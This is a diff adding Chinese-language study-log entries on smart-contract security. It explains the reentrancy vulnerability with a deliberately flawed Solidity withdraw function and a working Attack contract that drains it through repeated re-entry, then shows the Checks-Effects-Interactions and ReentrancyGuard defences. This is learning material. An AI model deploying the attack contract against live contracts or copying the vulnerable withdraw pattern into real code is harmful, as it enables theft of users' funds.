@@ -387,4 +387,101 @@ contract NFTTest is Test {
 ### 07.24
 - 今日学习时间：7.24  4 p.m.--5 p.m.
 - 学习内容小结：学习GPU代币合约漏洞
+### 07.25
+- 今日学习时间：7.25  4 p.m.--6 p.m.
+- 学习内容小结：学习重入攻击原理
+#### 重入攻击
+原理为在函数内部的多次操作，状态改变为在最后一次操作之后，故可以在合约状态改变之前，多次进行操作，直到目的达成。
+```sol
+function withdraw() public {
+     uint256 bal = balances[msg.sender];
+    require(bal > 0);
+    
+    (bool sent,) = msg.sender.call{value: bal}("");
+    require(sent, "Failed to send Ether");
+
+    balances[msg.sender] = 0;
+    }
+```
+当向合约中存入1ether，满足bal >0，即可进行withdraw操作。
+编写attack函数
+```sol
+contract Attack {
+    EtherStore public etherStore;
+    uint256 public constant AMOUNT = 1 ether;
+
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+
+    // receive is called when EtherStore sends Ether to this contract.
+    receive() external payable {
+        if (address(etherStore).balance >= AMOUNT) {
+            etherStore.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= AMOUNT);
+        etherStore.deposit{value: AMOUNT}();
+        etherStore.withdraw();
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+>receive是在合约接受到ether时自动执行的。当attack函数执行时，首先向目标合约存入amount数量的ether，然后将存入的ether取出。当attack合约接受到取出的ether时，自动执行receive，尝试取目标合约中的ether。因为此时的合约状态没有改变，receive函数将每次提取amount数量的ether，直到目标合约中余额不足而触发fallback。
+##### 防范措施
+通过`Check-Effects-Interactions(CEI)`模式
+```sol
+function withdraw() public {
+		// 1.check
+    uint256 bal = balances[msg.sender];
+    require(bal > 0);
+
+		// 2.effects
+    balances[msg.sender] = 0;
+
+		// 3.interactions
+    (bool sent,) = msg.sender.call{value: bal}("");
+    require(sent, "Failed to send Ether");
+}
+```
+其他防御措施，`ReentrancyGuard` 使用openzeppelin库中Guards（重入锁）
+```sol
+contract ReentrancyGuard {
+    bool internal locked;
+
+    modifier nonReentrant() {
+        require(!locked, "No reentrancy");
+        locked = true;
+        _;
+        locked = false;
+    }
+}
+
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+contract EtherStore is ReentrancyGuard {
+    
+    function withdraw() public nonReentrant {
+        uint256 bal = balances[msg.sender];
+        require(bal > 0);
+
+        (bool sent,) = msg.sender.call{value: bal}("");
+        require(sent, "Failed to send Ether");
+
+        balances[msg.sender] = 0;
+    }
+    
+    // ...
+}
+```
+它的作用就是在函数执行前先加一把锁，函数结束后释放锁，在发生重入时由于重新进入了该函数，此时锁还未释放，因此重入失败。
+（但是会有额外的gas费用产生，采用CEI模式是根本解决方案）
+### 07.26
+- 今日学习时间：7.26  5 p.m.--6 p.m.
+- 学习内容小结：学习闪电贷和合约账户漏洞
 <!-- Content_END -->
